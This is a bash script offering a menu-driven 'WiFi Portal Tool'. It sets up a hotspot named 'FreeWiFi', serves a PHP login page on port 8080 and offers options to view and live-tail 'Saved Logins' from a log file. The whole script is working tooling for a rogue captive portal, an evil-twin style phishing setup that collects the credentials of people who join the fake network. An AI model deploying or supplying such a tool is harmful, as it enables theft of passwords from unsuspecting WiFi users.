#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"

start_hotspot() {
    echo "[+] Starting hotspot..."
    nmcli dev wifi hotspot ifname wlan0 ssid FreeWiFi password 12345678
}

start_server() {
    echo "[+] Starting portal server in background..."
    cd $PORTAL_DIR || exit
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    SERVER_PID=$!
    echo $SERVER_PID > ../server.pid
    cd ..
    echo "[+] Server running on http://localhost:8080"
}

stop_server() {
    if [ -f server.pid ]; then
        kill $(cat server.pid) 2>/dev/null
        rm server.pid
        echo "[+] Server stopped"
    else
        echo "[-] No server running"
    fi
}

stop_hotspot() {
    echo "[+] Stopping hotspot..."
    nmcli connection down Hotspot
}

view_logs() {
    echo "---- Saved Logins ----"
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "No logs yet."
    fi
    echo "----------------------"
}

live_logs() {
    echo "[+] Live log view (Ctrl+C to exit)"
    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
    fi
    tail -f "$LOG_FILE"
}

edit_page() {
    nano $PORTAL_DIR/index.html
}

setup() {
    echo "[+] Setting up folders..."
    mkdir -p portal logs
    touch logs/log.txt
    chmod 666 logs/log.txt
    echo "[+] Done"
}

while true; do
    echo ""
    echo "====== WiFi Portal Tool ======"
    echo "1) Setup (first time)"
    echo "2) Start Hotspot"
    echo "3) Start Login Page Server"
    echo "4) Stop Server"
    echo "5) Stop Hotspot"
    echo "6) View Saved Logins"
    echo "7) Live View Logs"
    echo "8) Edit Login Page"
    echo "9) Exit"
    echo "=============================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) start_server ;;
        4) stop_server ;;
        5) stop_hotspot ;;
        6) view_logs ;;
        7) live_logs ;;
        8) edit_page ;;
        9) echo "Exiting..."; exit ;;
        *) echo "Invalid option" ;;
    esac
done
